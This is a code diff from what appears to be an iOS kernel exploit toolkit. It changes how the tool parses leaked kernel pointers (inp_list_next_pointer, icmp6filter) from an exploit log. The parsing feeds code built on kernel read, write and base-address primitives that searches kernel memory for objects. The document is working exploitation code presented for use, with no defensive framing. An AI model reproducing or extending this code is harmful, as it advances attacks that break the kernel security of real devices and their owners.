@@ -61,6 +61,17 @@ static int p113_rd_cs2(uint64_t a, void *b, size_t n) { return Lum1naCS2Core_KRe
 static int p113_wr_cs2(uint64_t a, const void *b, size_t n) { return Lum1naCS2Core_KWriteBuf(a, b, n) ? 0 : -1; }
 static int p113_kb_cs2(uint64_t *out) { *out = Lum1naCS2Core_Kbase(); return *out ? 0 : -1; }
 #endif
+/* v4b: C-string anchor parsing — NSScanner's old hex readers are unavailable
+   on the 17.0 SDK (same CI error P123 hit) and ?: chains on alloc'ed strings
+   trip clang ("cannot compile this scalar expression yet"). */
+static uint64_t p113_kernel_hex(NSString *hay, NSString *key) {
+    if (hay.length == 0 || key.length == 0) return 0;
+    const char *h = hay.UTF8String, *k = key.UTF8String;
+    const char *p = strstr(h, k);
+    if (p == NULL) return 0;
+    return strtoull(p + strlen(k), NULL, 16);
+}
+
 static int p113_rd_lk(uint64_t a, void *b, size_t n) { return g_h.kread(a, b, n); }
 static int p113_wr_lk(uint64_t a, const void *b, size_t n) { return g_h.kwrite(b, a, n); }
 static int p113_kb_lk(uint64_t *out) { return g_h.kbase(out); }
@@ -167,22 +178,18 @@ static NSString *P113Ret(void) {
         uint64_t kb2 = 0; if (g_kb(&kb2) != 0) return ane_none();
         uint64_t anchors[2] = { 0, 0 };
         NSString *docsA = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
-        NSMutableString *llA = [[NSMutableString alloc] initWithContentsOfFile:[docsA stringByAppendingPathComponent:@"cs2_core_log.txt"] encoding:NSUTF8StringEncoding error:nil] ?: [NSMutableString string];
+        NSMutableString *llA = [NSMutableString string];
+        NSString *cfA = [NSString stringWithContentsOfFile:[docsA stringByAppendingPathComponent:@"cs2_core_log.txt"] encoding:NSUTF8StringEncoding error:nil];
+        [llA appendFormat:@"%@", (cfA != nil ? cfA : @"")];
 #ifdef P113_HAS_CS2CORE
-        [llA appendFormat:@" %@", (Lum1naCS2Core_LastLog() ?: @"")];
+        [llA appendFormat:@" %@", (Lum1naCS2Core_LastLog() != nil ? Lum1naCS2Core_LastLog() : @"")];
 #endif
-        NSScanner *scA = [NSScanner scannerWithString:llA];
-        if ([scA scanUpToString:@"inp_list_next_pointer: 0x" intoString:NULL] &&
-            [scA scanString:@"inp_list_next_pointer: 0x" intoString:NULL] &&
-            [scA scanHexUnsignedLongLong:&anchors[0]] && anchors[0] >= 0xfffff00000000000ULL) {
-            p113_log(@"[v4] anchor inp-list-next = 0x%llx", anchors[0]);
-        } else { anchors[0] = 0; }
-        scA = [NSScanner scannerWithString:llA];
-        if ([scA scanUpToString:@"icmp6filter: 0x" intoString:NULL] &&
-            [scA scanString:@"icmp6filter: 0x" intoString:NULL] &&
-            [scA scanHexUnsignedLongLong:&anchors[1]] && anchors[1] >= 0xfffff00000000000ULL) {
-            p113_log(@"[v4] anchor icmp6filter = 0x%llx", anchors[1]);
-        } else { anchors[1] = 0; }
+        anchors[0] = p113_kernel_hex(llA, @"inp_list_next_pointer: 0x");
+        anchors[1] = p113_kernel_hex(llA, @"icmp6filter: 0x");
+        if (anchors[0] < 0xfffff00000000000ULL) { anchors[0] = 0; }
+        else { p113_log(@"[v4] anchor inp-list-next = 0x%llx", anchors[0]); }
+        if (anchors[1] < 0xfffff00000000000ULL) { anchors[1] = 0; }
+        else { p113_log(@"[v4] anchor icmp6filter = 0x%llx", anchors[1]); }
         uint8_t *rb = malloc(0x4000);
         for (int ai = 0; ai < 2 && !found; ai++) {
             if (!anchors[ai]) continue;
